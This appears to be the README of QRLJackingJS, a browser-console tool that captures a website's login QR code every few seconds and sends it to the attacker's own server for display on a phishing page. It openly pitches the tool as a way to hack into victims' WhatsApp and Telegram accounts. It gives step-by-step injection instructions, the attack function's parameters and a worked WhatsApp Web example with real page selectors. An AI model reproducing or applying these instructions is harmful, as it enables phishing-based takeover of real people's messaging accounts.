
<p align="center">
<img src="https://i.imgur.com/O8ppAj4.png" width="550px">
</p>

# About

Using a web browser only, this tool will copy the login QR code from your browser and send it to your own server so you can display it in a phishing page (~ real time). The QR code login method is supported by many apps including WhatsApp and Telegram, this tool will allow you to hack into victims accounts in no time.

# Documentation (Usage)

#### Step 1.

Open Firefox or Chrome (desktop verison) and go to the target website where you can find the needed QR code.

#### Step 2.

In the top address bar you can see permissions button on the left / right side. You must allow pop-ups for the target website. Also, you can allow pop-ups from the website permissions / settings list.

#### Step 3.

A. add the JQuery library code to the target browser tab using the Inspect Element → Console → Copy & Paste & Hit Enter.

```html
Copy the code from: jquery.min.js
```

B. add QRLJackingJS code (included) to the target browser tab using the Inspect Element → Console → Copy & Paste & Hit Enter.

```html
Copy the code from: qrljackingjs.min.js
```

#### Step 4.

Open inspect element tool in your browser then inpect the QR code or its container. Also, if there's a reload button like the one in WhatsApp Web, you can select it too to make sure that the tool will reload it automatically.

#### Step 5.

Now you are ready to start the attack. Call **QRLJackingJS()** function after adding your prefered settings.

```javascript
QRLJackingJs(
bas64ImageServerPOSTParam, // the parameter you have on your server to receive the base64 encoded image 
elementToScreenshotSelector, // the element that has the QR image in it eg. #qrCodeDiv 
attackWaitingTimeBeforeSendingEachScreenshotInSeconds, // waiting time between each screenshot sending. Recommended: 4
reloadButtonSelector, // optional: used to auto click the QR code reload element if any 
reloadButtonWaitingTimeBeforeSendingInSeconds // optional: waiting time after clicking the reload button and before sending the screenshot 
);
```

WhatsApp Web real example:

```javascript
QRLJackingJs(
'base64_image', // the parameter you have on your server to receive the base64 encoded image
'._2UwZ_:first', // the element that has the QR image in it
4, // waiting time between each screenshot sending
'._2znac:first', // used to auto click the QR code reload element if any
2 // waiting time after clicking the reload button and before sending the screenshot
);
```

### Explanation

The result is that the tool will send the QR code screenshot (._2UwZ_:first) to your server URL (the tool will ask you to enter it) each 4 seconds, the POST request parameter will be (base64_image) and the tool will auto-click the reload button (._2znac:first) then wait (2 seconds) before sending the new QR code again.

### Testing On WhatsApp Web and Telegram Web (PoC)

https://www.youtube.com/watch?v=MxbnwWJoMN0

### Official Project Documentation & Guide

Visit the project official page for step-by-step, screeshots and video guides:

https://uplody.com/lab/qrljackingjs/

### Copyrights

- QRLJackingJS Author: Mohammad F. Atwi | https://www.linkedin.com/in/mohd-atwi/
- QRLJacking Attack Author: Mohamed Abdelbasset Elnouby (@SymbianSyMoh) | https://github.com/SymbianSyMoh
- OWASP QRLJacking Attack: https://owasp.org/www-community/attacks/Qrljacking

